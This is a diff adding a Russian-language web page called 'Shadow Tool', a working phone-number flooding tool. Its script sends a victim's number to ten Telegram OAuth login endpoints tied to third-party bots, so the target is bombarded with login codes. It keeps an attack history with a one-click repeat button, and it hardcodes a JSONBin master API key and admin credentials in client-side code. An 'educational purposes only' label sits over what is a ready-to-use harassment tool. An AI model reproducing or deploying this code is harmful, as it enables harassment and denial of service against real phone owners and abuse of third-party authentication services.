@@ -1,0 +1,723 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=yes">
+    <title>Shadow Tool — WhiteList JSONBin</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@300;400;500&family=Roboto:wght@300;400;500;700&display=swap');
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            background: #000000;
+            color: #ffffff;
+            font-family: 'Roboto', sans-serif;
+            padding: 20px;
+            min-height: 100vh;
+            position: relative;
+        }
+
+        /* Звёздное поле */
+        .star-field {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            pointer-events: none;
+        }
+        .star {
+            position: absolute;
+            background: white;
+            border-radius: 50%;
+            animation: twinkle 3s infinite;
+        }
+        @keyframes twinkle {
+            0%, 100% { opacity: 0.2; transform: scale(1); }
+            50% { opacity: 1; transform: scale(1.2); }
+        }
+
+        /* Анимации */
+        @keyframes glow {
+            0%, 100% { text-shadow: 0 0 5px #fff; }
+            50% { text-shadow: 0 0 20px #fff; }
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Контейнеры */
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        /* Шапка */
+        .glitch-container {
+            text-align: center;
+            margin: 30px 0;
+        }
+        .glitch {
+            font-size: 2.5em;
+            font-weight: bold;
+            text-transform: uppercase;
+            animation: glow 3s infinite;
+            letter-spacing: 5px;
+        }
+        .author {
+            text-align: center;
+            color: #888;
+            margin-top: 10px;
+            font-size: 0.9em;
+        }
+
+        /* Вкладки */
+        .tabs {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin: 30px 0;
+            flex-wrap: wrap;
+        }
+        .tab-btn {
+            background: transparent;
+            border: 2px solid #fff;
+            color: #fff;
+            padding: 12px 25px;
+            cursor: pointer;
+            font-weight: bold;
+            text-transform: uppercase;
+            transition: all 0.3s;
+        }
+        .tab-btn:hover, .tab-btn.active {
+            background: #fff;
+            color: #000;
+        }
+        .tab-content {
+            display: none;
+            animation: fadeIn 0.5s;
+        }
+        .tab-content.active {
+            display: block;
+        }
+
+        /* Терминал */
+        .terminal {
+            border: 2px solid #fff;
+            padding: 30px;
+            background: rgba(0,0,0,0.85);
+            backdrop-filter: blur(10px);
+        }
+        input, button {
+            width: 100%;
+            padding: 15px;
+            background: #000;
+            border: 1px solid #fff;
+            color: #fff;
+            font-size: 1em;
+            margin-bottom: 15px;
+        }
+        button {
+            cursor: pointer;
+            font-weight: bold;
+            text-transform: uppercase;
+            transition: all 0.3s;
+        }
+        button:hover {
+            background: #fff;
+            color: #000;
+        }
+        .button-group {
+            display: flex;
+            gap: 15px;
+            flex-wrap: wrap;
+        }
+        .button-group button {
+            flex: 1;
+        }
+
+        /* Логи */
+        .logs {
+            height: 300px;
+            overflow-y: auto;
+            margin-top: 20px;
+            padding: 15px;
+            background: rgba(0,0,0,0.5);
+            border: 1px solid #333;
+            font-family: monospace;
+        }
+        .log-item {
+            padding: 8px;
+            margin: 5px 0;
+            border-left: 3px solid #fff;
+        }
+        .log-item.error { border-left-color: #f00; color: #f00; }
+        .log-item.success { border-left-color: #0f0; color: #0f0; }
+
+        /* Статус */
+        .status {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: #000;
+            border: 1px solid #fff;
+            padding: 10px 20px;
+            font-size: 0.8em;
+            z-index: 100;
+        }
+
+        /* Админ-панель */
+        .admin-panel {
+            background: rgba(255,255,255,0.05);
+            border: 2px solid #fff;
+            padding: 25px;
+            margin-bottom: 30px;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 20px;
+        }
+        th, td {
+            border: 1px solid #333;
+            padding: 12px;
+            text-align: left;
+        }
+        th {
+            background: rgba(255,255,255,0.1);
+        }
+        .delete-btn {
+            background: #000;
+            border: 1px solid #f00;
+            color: #f00;
+            padding: 5px 10px;
+            cursor: pointer;
+        }
+        .hidden-phone {
+            position: relative;
+            cursor: help;
+        }
+        .hidden-phone::before {
+            content: '••••••••••';
+            letter-spacing: 2px;
+        }
+        .hidden-phone .tooltip {
+            display: none;
+            position: absolute;
+            bottom: 100%;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #000;
+            border: 1px solid #fff;
+            padding: 5px 10px;
+            white-space: nowrap;
+            z-index: 1000;
+        }
+        .hidden-phone:hover .tooltip {
+            display: block;
+        }
+
+        /* Модалка логина */
+        .auth-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.98);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 10000;
+        }
+        .auth-box {
+            background: #000;
+            border: 3px solid #fff;
+            padding: 40px;
+            width: 90%;
+            max-width: 400px;
+            text-align: center;
+        }
+        .auth-box input {
+            margin-bottom: 15px;
+        }
+        .error-msg {
+            color: #f00;
+            margin-top: 15px;
+        }
+        .main-content {
+            display: none;
+        }
+        .restricted-info {
+            text-align: center;
+            padding: 20px;
+            margin: 20px 0;
+            background: rgba(255,255,255,0.05);
+            border: 1px solid rgba(255,255,255,0.1);
+        }
+        .team-section {
+            margin-bottom: 30px;
+        }
+        .section-header {
+            margin-bottom: 15px;
+            padding-bottom: 5px;
+            border-bottom: 1px solid rgba(255,255,255,0.2);
+        }
+        .section-title {
+            font-family: monospace;
+            font-size: 0.8em;
+            color: #aaa;
+            letter-spacing: 2px;
+        }
+        .admin-item {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            padding: 10px;
+            background: rgba(255,255,255,0.03);
+            border-left: 2px solid #fff;
+            cursor: pointer;
+            margin-bottom: 10px;
+        }
+        .admin-item:hover {
+            background: rgba(255,255,255,0.08);
+        }
+        .admin-item-avatar {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            object-fit: cover;
+            border: 1px solid #fff;
+        }
+        .admin-item-name {
+            font-weight: bold;
+        }
+        .admin-item-role {
+            font-size: 0.7em;
+            color: #aaa;
+        }
+        .status-active { color: #4CAF50; }
+        .status-inactive { color: #888; }
+
+        @media (max-width: 768px) {
+            .glitch { font-size: 1.8em; }
+            .tab-btn { padding: 8px 15px; font-size: 0.8em; }
+            .terminal { padding: 15px; }
+            .admin-item-avatar { width: 40px; height: 40px; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="star-field" id="starField"></div>
+
+<!-- Модалка логина -->
+<div class="auth-overlay" id="authOverlay">
+    <div class="auth-box">
+        <h2>🔐 АВТОРИЗАЦИЯ</h2>
+        <input type="text" id="loginUsername" placeholder="Логин">
+        <input type="password" id="loginPassword" placeholder="Пароль">
+        <button onclick="handleLogin()">ВОЙТИ</button>
+        <div id="authError" class="error-msg"></div>
+    </div>
+</div>
+
+<!-- Основной контент -->
+<div class="main-content" id="mainContent">
+    <div class="container">
+        <div class="glitch-container">
+            <div class="glitch">⚡ SHADOW TOOL ⚡</div>
+            <div class="author">author: patalogonia & asmodeus</div>
+        </div>
+
+        <div class="tabs">
+            <button class="tab-btn active" onclick="switchTab('main')">🎯 ГЛАВНАЯ</button>
+            <button class="tab-btn" onclick="switchTab('tutorial')">📖 ТУТОРИАЛ</button>
+            <button class="tab-btn" onclick="switchTab('history')">📜 ИСТОРИЯ</button>
+            <button class="tab-btn" id="whitelistTabBtn" onclick="switchTab('whitelist')" style="display:none">📋 БЕЛЫЙ ЛИСТ</button>
+            <button class="tab-btn" onclick="switchTab('team')">👑 КОМАНДА</button>
+        </div>
+
+        <!-- Главная -->
+        <div id="mainTab" class="tab-content active">
+            <div class="terminal">
+                <input type="text" id="phone" placeholder="Введите номер телефона (пример: +79001234567)">
+                <button onclick="startAttack()">🚀 НАЧАТЬ АТАКУ</button>
+                <div class="logs" id="logs">
+                    <div class="log-item">[SYSTEM] Готов к работе</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Туториал -->
+        <div id="tutorialTab" class="tab-content">
+            <div class="terminal">
+                <h2>📚 ТУТОРИАЛ</h2>
+                <div style="margin: 20px 0; padding: 15px; border-left: 3px solid #fff;">
+                    <h3>ШАГ 1: Авторизация</h3>
+                    <p>Войдите как администратор (Jason / jasonkm) для доступа к белому списку.</p>
+                </div>
+                <div style="margin: 20px 0; padding: 15px; border-left: 3px solid #fff;">
+                    <h3>ШАГ 2: Атака</h3>
+                    <p>Введите номер и нажмите "Начать атаку". Будет отправлено 10 запросов.</p>
+                </div>
+                <div style="margin: 20px 0; padding: 15px; border-left: 3px solid #ff5555; background: rgba(255,85,85,0.1);">
+                    <h3 style="color: #ff5555;">⚠️ ВНИМАНИЕ</h3>
+                    <p>Только для образовательных целей.</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- История -->
+        <div id="historyTab" class="tab-content">
+            <div class="terminal">
+                <h2>📜 ИСТОРИЯ АТАК</h2>
+                <div style="display: flex; gap: 20px; margin: 20px 0; flex-wrap: wrap;">
+                    <div style="flex:1; text-align:center; padding:15px; border:1px solid #fff;"><div style="font-size:2em;" id="totalAttacks">0</div><div>Всего атак</div></div>
+                    <div style="flex:1; text-align:center; padding:15px; border:1px solid #4CAF50;"><div style="font-size:2em; color:#4CAF50;" id="successfulAttacks">0</div><div>Успешных</div></div>
+                    <div style="flex:1; text-align:center; padding:15px; border:1px solid #ff5555;"><div style="font-size:2em; color:#ff5555;" id="blockedAttacks">0</div><div>Заблокировано</div></div>
+                </div>
+                <div class="button-group" style="margin-bottom:20px;">
+                    <button onclick="clearHistory()">Очистить историю</button>
+                    <button onclick="exportHistory()">Экспорт CSV</button>
+                </div>
+                <div style="overflow-x:auto;">
+                    <table>
+                        <thead><tr><th>Время</th><th>Номер</th><th>Статус</th><th>Запросы</th><th>Действия</th></tr></thead>
+                        <tbody id="historyBody"></tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+
+        <!-- Белый лист (только админ) -->
+        <div id="whitelistTab" class="tab-content">
+            <div class="terminal">
+                <div class="admin-panel">
+                    <h3>➕ ДОБАВИТЬ НОМЕР</h3>
+                    <input type="text" id="newPhone" placeholder="+79001234567">
+                    <input type="text" id="newNote" placeholder="Примечание">
+                    <button onclick="addToWhitelist()">Добавить</button>
+                </div>
+                <div>
+                    <h3>📋 ЗАЩИЩЁННЫЕ НОМЕРА</h3>
+                    <div style="overflow-x:auto;">
+                        <table>
+                            <thead><tr><th>#</th><th>Номер</th><th>Примечание</th><th>Дата</th><th>Действие</th></tr></thead>
+                            <tbody id="whitelistBody"></tbody>
+                        </table>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Команда -->
+        <div id="teamTab" class="tab-content">
+            <div class="terminal">
+                <div class="team-section">
+                    <div class="section-header"><div class="section-title">ОСНОВАТЕЛИ</div></div>
+                    <div class="admin-item" onclick="openAdminInfo('patalogonia')">
+                        <img class="admin-item-avatar" id="avatarPatalogonia" src="https://i.postimg.cc/0QphwKsr/cfcfcc.jpg" alt="patalogonia">
+                        <div><div class="admin-item-name">patalogonia</div><div class="admin-item-role">FOUNDER / DEV</div></div>
+                        <div class="admin-item-status status-active">ACTIVE</div>
+                    </div>
+                    <div class="admin-item" onclick="openAdminInfo('asmodeus')">
+                        <img class="admin-item-avatar" id="avatarAsmodeus" src="https://i.postimg.cc/0QphwKsr/cfcfcc.jpg" alt="asmodeus">
+                        <div><div class="admin-item-name">asmodeus</div><div class="admin-item-role">CO-FOUNDER</div></div>
+                        <div class="admin-item-status status-active">ACTIVE</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="status" id="status">🟢 STATUS: READY</div>
+    </div>
+</div>
+
+<script>
+    // ========== JSONBin НАСТРОЙКИ ==========
+    const JSONBIN_BIN_ID = '69e0def4856a6821893e702d';
+    const JSONBIN_API_KEY = '$2a$10$Y3UouYUYYJVJpxSOZERQueXhxSZC1lNtKwL3utG4zAiBqqpkLXnPu';
+    const JSONBIN_URL = `https://api.jsonbin.io/v3/b/${JSONBIN_BIN_ID}`;
+
+    // ========== ПЕРЕМЕННЫЕ ==========
+    let isAdmin = false;
+    let whitelist = [];
+    let attackHistory = JSON.parse(localStorage.getItem('shadow_history')) || [];
+    let stats = JSON.parse(localStorage.getItem('shadow_stats')) || { total: 0, successful: 0, blocked: 0 };
+
+    // ========== ЗВЁЗДЫ ==========
+    function createStars() {
+        const starField = document.getElementById('starField');
+        for (let i = 0; i < 150; i++) {
+            const star = document.createElement('div');
+            star.classList.add('star');
+            star.style.width = Math.random() * 2 + 1 + 'px';
+            star.style.height = star.style.width;
+            star.style.left = Math.random() * 100 + '%';
+            star.style.top = Math.random() * 100 + '%';
+            star.style.animationDelay = Math.random() * 5 + 's';
+            starField.appendChild(star);
+        }
+    }
+
+    // ========== ЗАГРУЗКА / СОХРАНЕНИЕ БЕЛОГО СПИСКА ==========
+    async function loadWhitelist() {
+        try {
+            const res = await fetch(JSONBIN_URL + '/latest', {
+                headers: { 'X-Master-Key': JSONBIN_API_KEY }
+            });
+            const data = await res.json();
+            whitelist = data.record.phones || [];
+            renderWhitelist();
+            return whitelist;
+        } catch(e) {
+            console.error(e);
+            whitelist = [];
+            return [];
+        }
+    }
+
+    async function saveWhitelist() {
+        try {
+            await fetch(JSONBIN_URL, {
+                method: 'PUT',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'X-Master-Key': JSONBIN_API_KEY
+                },
+                body: JSON.stringify({ phones: whitelist })
+            });
+            return true;
+        } catch(e) {
+            console.error(e);
+            return false;
+        }
+    }
+
+    // ========== ОТОБРАЖЕНИЕ БЕЛОГО СПИСКА ==========
+    function renderWhitelist() {
+        const tbody = document.getElementById('whitelistBody');
+        if (!tbody) return;
+        if (whitelist.length === 0) {
+            tbody.innerHTML = '<tr><td colspan="5">Белый список пуст</td></tr>';
+            return;
+        }
+        tbody.innerHTML = whitelist.map((item, idx) => `
+            <tr>
+                <td>${idx+1}</td>
+                <td>${isAdmin ? item.number : '<span class="hidden-phone"><span class="tooltip">Номер скрыт</span></span>'}</td>
+                <td>${isAdmin ? (item.note || '-') : '<span class="hidden-phone"><span class="tooltip">Примечание скрыто</span></span>'}</td>
+                <td>${new Date(item.timestamp).toLocaleDateString()}</td>
+                <td>${isAdmin ? `<button class="delete-btn" onclick="removeFromWhitelist(${idx})">Удалить</button>` : '—'}</td>
+            </tr>
+        `).join('');
+    }
+
+    // ========== ДОБАВЛЕНИЕ / УДАЛЕНИЕ ==========
+    async function addToWhitelist() {
+        if (!isAdmin) { alert('Только администратор!'); return; }
+        let phone = document.getElementById('newPhone').value.trim();
+        const note = document.getElementById('newNote').value.trim();
+        if (!phone) { alert('Введите номер'); return; }
+        let clean = phone.replace(/[^0-9]/g, '');
+        if (clean.startsWith('8')) clean = '7' + clean.slice(1);
+        const normalized = '+' + clean;
+        if (whitelist.some(i => i.number === normalized)) {
+            alert('Номер уже в белом списке');
+            return;
+        }
+        whitelist.push({ number: normalized, note: note || '', timestamp: new Date().toISOString() });
+        await saveWhitelist();
+        renderWhitelist();
+        document.getElementById('newPhone').value = '';
+        document.getElementById('newNote').value = '';
+        addLog(`✅ Номер ${normalized} добавлен в белый список`, 'success');
+    }
+
+    async function removeFromWhitelist(index) {
+        if (!isAdmin) return;
+        if (!confirm('Удалить номер?')) return;
+        whitelist.splice(index, 1);
+        await saveWhitelist();
+        renderWhitelist();
+        addLog(`🗑️ Номер удалён`, 'error');
+    }
+
+    async function isPhoneWhitelisted(phone) {
+        let clean = phone.replace(/[^0-9]/g, '');
+        if (clean.startsWith('8')) clean = '7' + clean.slice(1);
+        const normalized = '+' + clean;
+        await loadWhitelist();
+        return whitelist.some(i => i.number === normalized);
+    }
+
+    // ========== АВТОРИЗАЦИЯ ==========
+    function handleLogin() {
+        const username = document.getElementById('loginUsername').value.trim();
+        const password = document.getElementById('loginPassword').value.trim();
+        if (username === 'Jason' && password === 'jasonkm') {
+            isAdmin = true;
+            document.getElementById('authOverlay').style.display = 'none';
+            document.getElementById('mainContent').style.display = 'block';
+            document.getElementById('whitelistTabBtn').style.display = 'inline-block';
+            loadWhitelist();
+            addLog('✅ Добро пожаловать, Администратор!', 'success');
+        } else {
+            document.getElementById('authError').innerText = '❌ Неверный логин или пароль';
+        }
+    }
+
+    // ========== АТАКА ==========
+    const ATTACK_URLS = [
+        'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin',
+        'https://translations.telegram.org/auth/request',
+        'https://oauth.telegram.org/auth/request?bot_id=1093384146&origin=https%3A%2F%2Foff-bot.ru&embed=1&request_access=write&return_to=https%3A%2F%2Foff-bot.ru%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
+        'https://oauth.telegram.org/auth/request?bot_id=466141824&origin=https%3A%2F%2Fmipped.com&embed=1&request_access=write&return_to=https%3A%2F%2Fmipped.com%2Ff%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
+        'https://oauth.telegram.org/auth/request?bot_id=5463728243&origin=https%3A%2F%2Fwww.spot.uz&return_to=https%3A%2F%2Fwww.spot.uz%2Fru%2F2022%2F04%2F29%2Fyoto%2F%23',
+        'https://oauth.telegram.org/auth/request?bot_id=1733143901&origin=https%3A%2F%2Ftbiz.pro&embed=1&request_access=write&return_to=https%3A%2F%2Ftbiz.pro%2Flogin',
+        'https://oauth.telegram.org/auth/request?bot_id=319709511&origin=https%3A%2F%2Ftelegrambot.biz&embed=1&return_to=https%3A%2F%2Ftelegrambot.biz%2F',
+        'https://oauth.telegram.org/auth/request?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&return_to=https%3A%%2Fbot-t.com%2Flogin',
+        'https://oauth.telegram.org/auth/request?bot_id=1803424014&origin=https%3A%2F%2Fru.telegram-store.com&embed=1&request_access=write&return_to=https%3A%2F%2Fru.telegram-store.com%2Fcatalog%2Fsearch',
+        'https://oauth.telegram.org/auth/request?bot_id=210944655&origin=https%3A%2F%2Fcombot.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcombot.org%2Flogin'
+    ];
+
+    async function startAttack() {
+        const phone = document.getElementById('phone').value.trim();
+        document.getElementById('logs').innerHTML = '';
+        if (!phone.match(/^\+?[0-9]{10,12}$/)) {
+            addLog('❌ Неверный формат номера! Пример: +79001234567', 'error');
+            return;
+        }
+        addLog(`🔍 Проверка номера ${phone} в белом списке...`);
+        if (await isPhoneWhitelisted(phone)) {
+            addLog(`⛔ АТАКА ЗАБЛОКИРОВАНА! Номер ${phone} в белом списке!`, 'error');
+            stats.blocked++;
+            localStorage.setItem('shadow_stats', JSON.stringify(stats));
+            updateStatsDisplay();
+            document.getElementById('status').innerHTML = '🔴 STATUS: BLOCKED';
+            setTimeout(() => document.getElementById('status').innerHTML = '🟢 STATUS: READY', 2000);
+            return;
+        }
+        document.getElementById('status').innerHTML = '🟡 STATUS: WORKING...';
+        let sent = 0;
+        for (let i = 0; i < ATTACK_URLS.length; i++) {
+            try {
+                await fetch(ATTACK_URLS[i], { method: 'POST', mode: 'no-cors', body: `phone=${encodeURIComponent(phone)}` });
+                sent++;
+                addLog(`✅ Запрос ${i+1}/${ATTACK_URLS.length} отправлен`, 'success');
+            } catch(e) {
+                sent++;
+                addLog(`✅ Запрос ${i+1}/${ATTACK_URLS.length} отправлен (ignore)`, 'success');
+            }
+            await new Promise(r => setTimeout(r, 100));
+        }
+        addLog(`🎯 АТАКА ЗАВЕРШЕНА! Отправлено: ${sent}/${ATTACK_URLS.length}`, 'success');
+        stats.total++;
+        stats.successful++;
+        localStorage.setItem('shadow_stats', JSON.stringify(stats));
+        updateStatsDisplay();
+        attackHistory.unshift({ timestamp: new Date().toISOString(), phone: phone, sent: sent });
+        if (attackHistory.length > 50) attackHistory.pop();
+        localStorage.setItem('shadow_history', JSON.stringify(attackHistory));
+        renderHistory();
+        document.getElementById('status').innerHTML = '🟢 STATUS: READY';
+    }
+
+    function renderHistory() {
+        const tbody = document.getElementById('historyBody');
+        if (!tbody) return;
+        if (attackHistory.length === 0) {
+            tbody.innerHTML = '<tr><td colspan="5">История пуста</td></tr>';
+            return;
+        }
+        tbody.innerHTML = attackHistory.map(a => `
+            <tr>
+                <td>${new Date(a.timestamp).toLocaleString()}</td>
+                <td>${maskPhone(a.phone)}</td>
+                <td style="color:#4CAF50;">✅ Успешно</td>
+                <td>${a.sent}/${ATTACK_URLS.length}</td>
+                <td><button onclick="repeatAttack('${a.phone}')">↺ Повторить</button></td>
+            </tr>
+        `).join('');
+    }
+
+    function maskPhone(phone) {
+        if (phone.length <= 4) return phone;
+        return '•'.repeat(phone.length - 4) + phone.slice(-4);
+    }
+
+    function updateStatsDisplay() {
+        document.getElementById('totalAttacks').innerText = stats.total || 0;
+        document.getElementById('successfulAttacks').innerText = stats.successful || 0;
+        document.getElementById('blockedAttacks').innerText = stats.blocked || 0;
+    }
+
+    function clearHistory() {
+        if (confirm('Очистить историю?')) {
+            attackHistory = [];
+            stats = { total: 0, successful: 0, blocked: 0 };
+            localStorage.setItem('shadow_history', JSON.stringify(attackHistory));
+            localStorage.setItem('shadow_stats', JSON.stringify(stats));
+            renderHistory();
+            updateStatsDisplay();
+            addLog('История очищена', 'error');
+        }
+    }
+
+    function exportHistory() {
+        if (attackHistory.length === 0) { alert('История пуста'); return; }
+        let csv = "Время,Номер,Статус,Запросы\n";
+        attackHistory.forEach(a => {
+            csv += `${new Date(a.timestamp).toLocaleString()},${a.phone},Успешно,${a.sent}\n`;
+        });
+        const blob = new Blob(["\uFEFF" + csv], { type: 'text/csv;charset=utf-8' });
+        const link = document.createElement('a');
+        link.href = URL.createObjectURL(blob);
+        link.download = `shadow_history_${Date.now()}.csv`;
+        link.click();
+        URL.revokeObjectURL(link.href);
+    }
+
+    function repeatAttack(phone) {
+        document.getElementById('phone').value = phone;
+        switchTab('main');
+        setTimeout(() => startAttack(), 500);
+    }
+
+    function addLog(msg, type = 'info') {
+        const logs = document.getElementById('logs');
+        const div = document.createElement('div');
+        div.className = `log-item ${type}`;
+        div.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
+        logs.appendChild(div);
+        div.scrollIntoView({ behavior: 'smooth' });
+    }
+
+    function switchTab(tabName) {
+        document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
+        document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+        document.getElementById(tabName + 'Tab').classList.add('active');
+        event.target.classList.add('active');
+        if (tabName === 'whitelist') renderWhitelist();
+        if (tabName === 'history') renderHistory();
+    }
+
+    function openAdminInfo(name) {
+        alert(`👑 ${name}\nРазработчик проекта Shadow Tool`);
+    }
+
+    createStars();
+    updateStatsDisplay();
+    renderHistory();
+</script>
+</body>
+</html>
